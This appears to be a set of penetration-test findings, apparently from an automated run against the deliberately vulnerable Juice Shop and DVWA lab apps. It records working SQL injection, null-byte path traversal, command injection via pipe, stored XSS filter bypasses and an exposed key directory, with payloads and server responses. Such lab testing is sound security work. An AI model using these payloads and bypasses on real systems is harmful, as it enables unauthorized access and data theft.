findings.title: Login Authentication-Bypass SQL Injection returns admin token
findings.response_evidence: HTTP 200. Response: {\"authentication\":{\"token\":\"[JWT issued]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The SQLi payload email=' OR 1=1-- bypasses authentication and resolves to the FIRST user admin@juice-sh.op (bid:1), returning a valid auth token without valid credentials. Token prefix: the response contained a JWT under authentication.token; umail resolved to admin@juice-sh.op.

findings.title: Product-Search SQL Injection (SQLITE_ERROR + 9-column UNION)
findings.response_evidence: Single-quote payload q=qwert' returned HTTP 500 with SQL error: 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. The 9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — the injected column constants (1..9) are reflected into the result object fields, confirming controllable 9-column UNION SQL injection.

findings.title: Unauthenticated Feedbacks endpoint — author emails are masked, no full PII disclosed
findings.response_evidence: HTTP 200 returned feedback records without authentication, but author email addresses in the comment strings are MASKED, not fully disclosed: e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'. The local-part of each address is redacted with asterisks, so no complete author email address is disclosed. Verification criterion (CWE-359: disclose author email addresses) is NOT met — the strict behavioral bar requires a full email, and only masked fragments plus UserId values are exposed. Rejected.

findings.title: Poison Null-Byte Path Traversal bypasses .md/.pdf filter to retrieve restricted package.json.bak
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak%2500.md (URL-encoded null byte + .md) -> HTTP 200 returns backup file content
findings.response_evidence: Baseline: raw path GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed! at verify (/juice-shop/build/routes/fileServer.js:55:18)' confirming the extension filter blocks .bak. Bypass: GET /ftp/package.json.bak%2500.md returned HTTP 200 (content-type application/octet-stream) serving the restricted backup file. Excerpt: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": { "body-parser": "~1.18", "express": "~4.16", "express-jwt": "0.1.3", "sequelize": "~4", "sqlite3": "~3.1.13" ... } }'. The null byte (%2500 -> %00) truncates the filename before extension validation, bypassing the .md/.pdf allowlist and exposing the restricted .bak file.

findings.title: Exposed encryption-keys directory browsable, leaking sensitive key files
request_sequence: GET http://juiceshop:3000/encryptionkeys/ (Accept: text/html,application/json) -> HTTP 200 serve-index directory listing
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 with a serve-index directory listing (unauthenticated). Listing visible text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 premium.key 50 12/19/2023'. The directory is browsable and exposes sensitive key files jwt.pub (248B) and premium.key (50B), with direct links http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key accessible without authentication.

findings.title: SQL Injection (numeric boolean) at DVWA security=medium
findings.response_evidence: [security=medium] Numeric boolean injection (quotes escaped via mysqli_real_escape_string). TRUE payload `id=1 OR 1=1` returned MULTIPLE seeded records/surnames: admin(admin), Gordon(Brown), Hack(Me), Pablo(Picasso), Bob(Smith). FALSE payload `id=1 AND 1=2` returned ZERO records (no First name/Surname rows rendered). This proves boolean-based SQLi at medium level.

findings.title: OS Command Injection (pipe bypass) at DVWA security=medium
findings.response_evidence: [security=medium] Medium blacklists ';' and '&&'. Pipe bypass payload `ip=127.0.0.1| whoami` executed successfully; response output (pre block) contained the web-process identity `www-data`, proving OS command injection.

findings.title: Stored XSS (nested-tag filter bypass) at DVWA security=medium
findings.response_evidence: [security=medium] Medium applies a single case-sensitive str_replace that strips one literal '<script>' from mtxMessage. Bypassed via nested-tag payload `<scr<script>ipt id="test_token">window.xss_flag=1</script>` submitted through http_request (bypassing client maxlength). After removing the inner '<script>', the server reconstructs a valid `<script id="test_token">window.xss_flag=1</script>` which is stored and rendered. Stored guestbook entry displayed 'Name: canary Message: window.xss_flag=1'.
findings.browser_js_evidence: window.xss_flag === 1 (evaluated in dvwa_admin browser context). document.getElementById('test_token').outerHTML === '<script id="test_token">window.xss_flag=1</script>' confirming the injected script executed on page render.

findings.title: SQL Injection (HIGH) via out-of-band session input — boolean bypass with trailing comment
findings.response_evidence: [security=high] Security page confirms "Security level is currently: high." TRUE payload (1' OR '1'='1' #) submitted via out-of-band session-input.php then rendered on GET /vulnerabilities/sqli/ returned MULTIPLE seeded user rows: First name: admin/Surname: admin; Gordon/Brown; Hack/Me; Pablo/Picasso; Bob/Smith (5 surnames: admin, Brown, Me, Picasso, Smith). FALSE control (1' AND '1'='2' #) returned ZERO records (no First name/Surname rows rendered). The trailing '#' comment was required because the query appends LIMIT 1. This boolean differential proves injection at security=high.

findings.title: OS Command Injection (HIGH) via pipe with no trailing space
findings.response_evidence: [security=high] Page confirms "Security Level: high". Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-level blacklist that strips '; ', '| ' pipe+space, and '&&'). Response pre block output contained the web-process identity: "www-data". This proves OS command execution as the web user at security=high.

findings.title: DVWA Stored XSS via guestbook mtxMessage field [security=high]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> confirms 'Security level is currently: high'

POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form_data: txtName=qa & mtxMessage=<script id="test_token">window.xss_flag=1</script> & btnSign=Sign Guestbook  (client-side maxlength=50 bypassed by direct http_request POST)
findings.response_evidence: [security=high] Level-specific payload injected into the server-side-vulnerable mtxMessage field (txtName filters <script> at high, mtxMessage does not): <script id="test_token">window.xss_flag=1</script>. security.php confirmed "Security level is currently: high". After POST, a new guestbook entry (Name: qa) was persisted with the raw script payload. On re-rendering the page in an authenticated browser, the injected node is present in the DOM: document.getElementById('test_token').outerHTML == '<script id="test_token">window.xss_flag=1</script>'. The script executed: window.xss_flag === 1. Stored XSS confirmed at high security.
